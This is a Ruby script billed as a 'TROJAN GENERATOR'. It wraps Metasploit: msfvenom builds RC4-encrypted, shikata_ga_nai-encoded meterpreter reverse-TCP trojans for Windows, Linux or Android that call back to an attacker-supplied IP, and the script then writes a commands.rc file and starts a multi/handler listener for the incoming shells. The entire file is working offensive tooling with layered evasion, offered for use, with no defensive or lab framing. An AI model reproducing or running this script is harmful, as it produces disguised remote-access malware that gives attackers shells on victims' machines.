#!/usr/bin/env ruby
#
# PASS IN YOUR IP ADDRESS AS THE ARGUMENT TO THE SCRIPT. You IP address will be set to home in the trojan virus. After creating the virus, a reverse TCP handler starts.
# @author Chris Basinger<evilthreads669966@gmail.com>
# TROJAN GENERATOR
#
# set the IP address to the first program argument
ip = ARGV[0]
# set the key to the second program argument
key = ARGV[1]

#exit if metasploit is not installed
response = system('which msfconsole')
if !response
  puts 'Metasploit is not installed.'
  exit! 1
end

puts "TROJAN GENERATOR"
puts "Enter WINDOWS | ANDROID | LINUX"

# Get the platform type
selection = STDIN.gets.chomp.upcase

# run msfvenom to generate the virus file.
case selection
when "LINUX"
  fileName = "trojan.elf"
  puts `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=#{ip} --encrypt rc4 --encrypt-key #{key} -e x86/shikata_ga_nai -i 5 -f elf -o #{fileName}`
when "WINDOWS"
  fileName = "trojan.exe"
  puts `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=#{ip} --encrypt rc4 --encrypt-key #{key} -e x86/shikata_ga_nai -i 5 -f exe -o #{fileName}`
when "ANDROID"
  fileName = "trojan.apk"
  puts `msfvenom -p android/meterpreter/reverse_tcp LHOST=#{ip} --encrypt rc4 --encrypt-key #{key} -e x86/shikata_ga_nai -i 5 -f raw -o #{fileName}`
else
  # exit if the user entered an invalid selection
  puts "Invalid selection"
  exit! 1
end

puts "TROJAN HAS BEEN GENERATED #{fileName}"
puts "STARTING METERPRETER"

# Create file and write commands to it for msfconsole
file = File.new("commands.rc", 'w')
file.puts "use exploit/multi/handler"
case selection
when "LINUX"
  file.puts "set payload linux/x86/meterpreter/reverse_tcp"
when "WINDOWS"
  file.puts "set payload windows/x64/meterpreter/reverse_tcp"
when "ANDROID"
  file.puts "set payload android/meterpreter/reverse_tcp"
end
file.puts "set LHOST #{ip}"
file.puts "exploit"
file.close

# run MSFCONSOlE with the created file as an argument
exec("msfconsole -r #{Dir.pwd}/commands.rc")